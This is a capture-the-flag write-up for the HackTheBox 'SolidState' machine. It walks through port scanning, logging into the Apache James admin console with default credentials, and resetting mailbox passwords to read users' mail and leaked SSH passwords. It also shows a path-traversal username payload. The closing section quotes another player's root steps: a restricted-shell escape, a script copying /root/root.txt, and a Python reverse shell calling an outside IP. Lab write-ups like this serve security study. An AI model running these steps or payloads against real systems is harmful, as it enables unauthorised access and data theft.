# MACHINE CHALLENGE: SOLIDSTATE

## Challenge Description

##### Own system
Type below the hash that is inside the root.txt file in the machine. The file
can be found under /root on Linux machines and at the Desktop of the
Administrator on Windows.

##### Own User
Type below the hash that is inside the user.txt file in the machine. The file
can be found under /home/{username} on Linux machines and at the Desktop of the
user on Windows. 

```
IP Address: 10.10.10.51
OS: Linux
```

### PORTSCANNING w/ NMAP

Use `nmap` to see if we can detect what services our host is offering, what
operating system (and version) our host is running, what type of packet
filters/firewalls are in use, etc.

```
$ sudo nmap -A -sS -T4 10.10.10.51
```

```
Nmap scan report for 10.10.10.51
Host is up (0.41s latency).
Not shown: 576 closed ports, 419 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (EdDSA)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.16.124 [10.10.16.124]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
```

So we have 5 open services running - ssh(22), smtp(25), http(80), pop3(110),
nntp(119).

### ENUMERATING PORT 80 (HTTP)

Checking out what we have running on the webserver, we find a home page of
"Solid State" security..

<img src="solidstate-index.html.jpg" width=500px/>

There is a "contact us" webform at the bottom of each page. Jamming some test
values and clicking submit doesn't give any special feedback. Examining the
server responses using `Burpsuite` doesn't appear to yield anything useful
either.

Let's see what other directories we can discover..

```
dirb http://10.10.10.51 /usr/share/wordlists/dirb/small.txt -x /usr/share/wordlists/dirb/extensions_common.txt
```

```
---- Scanning URL: http://10.10.10.51/ ----
+ http://10.10.10.51/about.html (CODE:200|SIZE:7183)                           
==> DIRECTORY: http://10.10.10.51/assets/                                      
+ http://10.10.10.51/assets/ (CODE:200|SIZE:1496)                              
+ http://10.10.10.51/icons/ (CODE:403|SIZE:292)                                
==> DIRECTORY: http://10.10.10.51/images/                                      
+ http://10.10.10.51/images/ (CODE:200|SIZE:2516)                              
+ http://10.10.10.51/index.html (CODE:200|SIZE:7776)                           
+ http://10.10.10.51/services.html (CODE:200|SIZE:8404) 
                                                                               
---- Entering directory: http://10.10.10.51/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.10.10.51/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
```

Interesting, so I figured out why this machine is called `Solid State` now
from the file below.  Apparently it is a website template.

```
http://10.10.10.51/assets/js/main.js

/*
	Solid State by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
*/
```

Wonder if there are known vulnerabilities with this template? The name of
the "Security Company" listed at this website is also called "Solid State".

### ENUMERATING PORT 25 (SMTP)

Let's see if we can mine a list of valid users / email addresses from SMTP..

```
msf > use auxiliary/scanner/smtp/smtp_enum
msf auxiliary(smtp_enum) > set RHOSTS 10.10.10.51
RHOSTS => 10.10.10.51
msf auxiliary(smtp_enum) > run

[*] 10.10.10.51:25        - 10.10.10.51:25 Banner: 220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Tue, 9 Jan 2018 22:02:39 -0500 (EST)
[*] 10.10.10.51:25        - 10.10.10.51:25 could not be enumerated (no EXPN, no VRFY, invalid RCPT)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Boo, that didn't work.

```
$ telnet 10.10.10.51 25
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Tue, 9 Jan 2018 21:48:13 -0500 (EST)
VRFY root
502 5.3.3 VRFY is not supported
EXPN
502 5.3.3 EXPN is not supported
HELO solid-state-security.com
250 solidstate Hello solid-state-security.com (10.10.16.124 [10.10.16.124])
MAIL FROM:<root>
250 2.1.0 Sender <root@localhost> OK
RCPT TO:<root>
250 2.1.5 Recipient <root@localhost> OK
```

So okay, seems like the sys admin has disabled VRFY, EXPN and RCPT to block
that method of enumeration.

```
$ nmap --script smtp-enum-users.nse 10.10.10.51

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-09 22:01 EST
Nmap scan report for 10.10.10.51
Host is up (0.41s latency).
Not shown: 523 filtered ports, 473 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
| smtp-enum-users: 
|_  root
80/tcp  open  http
110/tcp open  pop3
```

Using `nmap` again with the SMTP enum script finds `root` as the valid user, but
not really sure what to do with that.

### APACHE JAMES 2.3.2

Referring back to our `nmap` exploration, we know that the server is running
Apache James 2.3.2 email server.

```
25/tcp  open  smtp    JAMES smtpd 2.3.2
```

A quick search around gives us something promising! (a white paper describing
an attack against Apache James Server)..

```
https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf
```

```
Apache James 2.3.2 is an email server containing a vulnerability that allows an
attacker to execute arbitrary commands on the machine running the server. The
vulnerability arises from an insecure default configuration and a lack of input
validation in the server’s user creation mechanism; it allows an attacker to
enqueue commands to execute when a user signs into the machine.
```

```
Apache James exposes an administration console allowing privileged users to
configure and manage the server and tweak its functions. By default, the server
is configured to listen for email transactions on network port 25 and
administration transactions on port 4555
```

```
.. usernames are not sufficiently validated at the time of user creation, and
prepending a series of the parent-directory symbol, “../,” causes the server to
create a user directory outside of the installation directory. A username such
as “../../../../../../../../etc/bash_completion.d” can lead to files being
placed in “/etc/bash_completion.d,” a directory containing commands that execute
when a user signs into the machine. By sending messages to this user, an
attacker can execute commands that probe the mail server and retrieve data from
it.
```

```
By default, the Apache James administrator has the same username and password,
“root.” Using these credentials gives us access to the administration console,
where we can create new users with the “adduser” command.
```

So let's try this out against our machine..

```
$ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james mypasswd
Password for james reset
```

Holy crap!

### POP3

So now let's test out our newly reset credentials against the POP3 port..

```
$ telnet 10.10.10.51 pop3
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS mypasswd
+OK Welcome james
LIST
+OK 0 0
.
```

Iterating through `james`, `thomas` and `mailadmin` only shows empty inboxes,
but we find what we're looking for once we get to `john` and `mindy`!

```
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

No let's go take a look at Mindy's inbox!

```
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome
Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

### OWN USER

So with our intercepted temporary credentials from `mindy`, we can `ssh` into
the system and poke around to find our `user.txt`.

```
$ ssh mindy@10.10.10.51
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  9 22:35:44 2018 from 10.10.14.36
mindy@solidstate:~$ cat user.txt
914d0a4ebc177889b5b89a23f556fd75
```

### OWN MACHINE

Let's see what exploration we can do with Mindy's credentials..

```
mindy@solidstate:~$ pwd
/home/mindy
mindy@solidstate:~$ ls 
bin  user.txt
mindy@solidstate:~$ ls -l bin
total 0
lrwxrwxrwx 1 root root 8 Aug 22 13:45 cat -> /bin/cat
lrwxrwxrwx 1 root root 8 Aug 22 13:45 env -> /bin/env
lrwxrwxrwx 1 root root 7 Aug 22 13:45 ls -> /bin/ls
mindy@solidstate:~$ cd ..
-rbash: cd: restricted
```

I see now by what James` email meant by "restricting" Mindy's account now..

##### CREATE EXPLOITABLE USER

So going back to the white paper, sounds like we first need to create an
exploitable user.

```
To gain the ability to put files in “/etc/bash_completion.d,” we create a mail
user with the username “../../../../../../../../etc/bash_completion.d” with the
command “adduser ../../../../../../../../etc/bash_completion.d exploit”
```

```
$ telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d exploit
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
setpassword ../../../../../../../../etc/bash_completion.d foo 
Password for ../../../../../../../../etc/bash_completion.d reset
```

Now that we've created the user, let's log into its mailbox to validate..

```
$ telnet 10.10.10.51 pop3
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER ../../../../../../../../etc/bash_completion.d
+OK
PASS foo
+OK Welcome ../../../../../../../../etc/bash_completion.d
LIST
+OK 1 612
1 612
.
RETR 1
+OK Message follows
Return-Path: <'@team.pl>
Message-ID: <4054205.0.1515690202462.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.15.220 ([10.10.15.220])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 633
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Thu, 11 Jan 2018 12:03:22 -0500 (EST)
Date: Thu, 11 Jan 2018 12:03:22 -0500 (EST)
From: team@team.pl

'
[ "$(id -u)" == "0" ] && touch /root/proof.txt

.
```

```
$ ssh mindy@10.10.10.51
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  9 22:35:44 2018 from 10.10.14.36
$ ls -l /etc/bash_completion.d
total 56
-rw-r--r-- 1 root root   439 Aug  9 02:49 git-prompt
-rw-r--r-- 1 root root 11144 Feb 11  2017 grub
```
So.. we have the user, but how do we get commands to execute? 

#### RBASH ESCAPE

After researching around, decided to try another approach to priviledge
escalation which was trying to break free of Mindy's restricted shell.

```
https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
```

.. but didn't get around to trying this before the machine was retired :-(


### RETIRED

```
https://reboare.github.io/hackthebox/solidstate.html
```

Reading up another user's solution, found the remaining steps were:

1. Escaping Mindy's restricted shell `ssh mindy@10.10.10.51 'bash --noprofile'`

2. Exploiting the world-writeable executable file `/opt/tmp.py` owned by `root`

3. And either using that file to dump the flag (since there is a root cronjob
   setup to execute that file periodically) or use that file to trigger a
   <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a> which you can use to dump root.txt yourself.

<ul>
<li> Python script to dump `/root/root.txt`..
```
#!/usr/bin/env python

import os

with open('/root/root.txt', 'rb') as rootfile:
    with open('/var/tmp/.crash', 'wb') as openthis:
        openthis.write(rootfile.read())
```
<li> Python script to trigger reverse shell..
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.174",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
</ul>
